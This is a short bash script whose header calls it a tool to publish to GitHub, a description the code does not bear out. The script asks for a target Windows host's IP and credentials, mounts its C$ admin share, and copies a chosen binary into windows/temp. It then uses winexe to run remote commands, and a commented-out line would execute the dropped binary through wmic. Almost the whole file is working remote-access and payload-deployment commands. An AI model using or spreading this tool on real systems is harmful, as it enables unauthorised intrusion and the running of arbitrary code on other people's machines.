#################################################
# Created by @jgaudard  :: I don't twitter much 
# bash script to publish to github, for the lazy...
# Created: 18 June 2016    Edited: 
# Version 0.1
#################################################
read -p "What is the target host's IP?: " ipaddy
read -p "What is the targets username?: " username
read -p "What is the targets password?: " password
read -p "What is the local path of the binary?: " lpath
read -p "What is the remote path?: " rpath

mkdir /mnt/targetdrive
mount.cifs //$ipaddy/C$ /mnt/targetdrive -o user=$username,password=$password
cp $lpath /mnt/targetdrive/windows/temp 
winexe -U "$username%$password" //$ipaddy ipconfig
winexe -U "$username%$password" //$ipaddy "wmic os list brief"
#winexe -U "$username%$password" //$ipaddy "wmic process call create $rpath"

